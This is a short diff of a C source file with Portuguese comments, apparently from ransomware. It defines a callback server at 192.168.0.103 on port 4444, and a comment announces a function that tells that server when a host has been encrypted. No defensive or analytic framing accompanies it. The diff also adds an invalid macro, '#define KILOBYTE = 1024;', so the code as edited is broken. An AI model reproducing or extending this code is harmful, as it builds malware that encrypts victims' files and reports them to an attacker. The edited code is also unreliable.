@@ -120,10 +120,10 @@ soquete? (Não em POSIX.1-1996.)
 
 
 */
-#include <stdio.h>  // Entrada e saida padrao de dados
-#include <stdlib.h> // Biblioteca padrao
-#include <string.h> // Tratar strings
-#include <dirent.h> // Entrada de diretorios
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <dirent.h> 
 #include <errno.h> 
 #include <sys/types.h>
 #include <sys/socket.h>
@@ -134,11 +134,12 @@ soquete? (Não em POSIX.1-1996.)
 #include <unistd.h>
 #include <sys/stat.h>
 #include <sys/types.h>
-struct dirent *getdir;
 
+#define KILOBYTE = 1024;
 #define myhost "192.168.0.103"
 #define myport 4444
-const unsigned long KILOBYTE = 1024;
+
+struct dirent *getdir;
 
 
 //Funçao que avisa o servidor que algum host foi criptografado
